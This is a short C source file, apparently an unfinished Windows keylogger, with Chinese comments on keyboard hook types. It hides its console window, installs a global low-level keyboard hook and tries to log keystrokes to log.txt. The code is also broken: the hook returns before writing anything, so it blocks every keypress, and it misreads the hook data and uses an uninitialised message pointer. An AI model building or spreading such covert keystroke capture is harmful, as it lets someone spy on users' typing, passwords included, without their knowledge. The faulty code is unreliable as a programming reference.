#include <stdio.h>
#include <windows.h>
#include <winuser.h>

int hideConsole ( void );
 

HHOOK hook;
LPMSG msg;
FILE *LOG;

void Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}





LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
    LOG = fopen("log.txt", "a+");

/*
凡是ALT和其它键一同按下的组合称为“系统键”，窗口收到系统键之后，会自动地将它解释成系统事件，或者查阅键盘加速表，将系统键翻译成加速表指定的信息。如：ALT+F4的组合会迫使窗口关闭，“ALT+字母”的组合可能会拉下某个菜单。
非系统键就是不按下ALT键时的按键（比如单一按键）
 0 
 
一：WM_KEYDOWN、WM_KEYUP、WM_SYSKEYDOWN或WM_SYSKEYUP。


 
 

*/



    if (wParam == WM_KEYDOWN)
    {
		return 1;
        fputs((char *)lParam, LOG);
		
        fclose(LOG);
    }

    return CallNextHookEx(hook, code, wParam, lParam);
}

int main()
{
	hideConsole ();
   // Stealth();
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
//LowLevelKeyboardProc
//keyHook =SetWindowsHookEx( WH_KEYBOARD_LL,keyProc,GetModuleHandle(NULL),0);//GetModuleHandle(NULL)取得本程序的句柄
// https://blog.csdn.net/qq_31073871/article/details/80681855?utm_medium=distribute.wap_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7Edefault-10.essearch_wap_relevant&depth_1-utm_source=distribute.wap_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7Edefault-10.essearch_wap_relevant
// keybd_event


//dwThreadId 设置为0，则是全局钩子。

/*
HHOOK SetWindowsHookExA(
  int       idHook,
  指示欲被安装的挂钩处理过程之类型
WH_KEYBOARD(2):安装一个挂钩处理过程对击键消息进行监视. 详情参见KeyboardProc挂钩处理过程.

WH_KEYBOARD_LL(13):此挂钩只能在Windows NT中被安装,用来对底层的键盘输入事件进行监视.详情参见LowLevelKeyboardProc挂钩处理过程.

WH_MOUSE(7):安装一个挂钩处理过程,对鼠标消息进行监视. 详情参见 MouseProc挂钩处理过程.

WH_MOUSE_LL(14):此挂钩只能在Windows NT中被安装,用来对底层的鼠标输入事件进行监视.详情参见LowLevelMouseProc挂钩处理过程.
  
  HOOKPROC  lpfn,
  
指向相应的挂钩处理过程
  

  
  HINSTANCE hmod,
动态链接的句柄
  DWORD     dwThreadId
);
    */
    if (hook != NULL)
        puts("All is good");
    else
        puts("Something went wrong :(");
    LOG = fopen("log.txt", "w");
    fclose(LOG);
    
	while (GetMessage(msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(msg);
        DispatchMessage(msg);
    }
	
    return 0;
}



int hideConsole ( void )
{
  

HWND hWnd = GetConsoleWindow();
   // ShowWindow( hWnd, SW_MINIMIZE );
    ShowWindow( hWnd, SW_HIDE );

return 0;
}
 
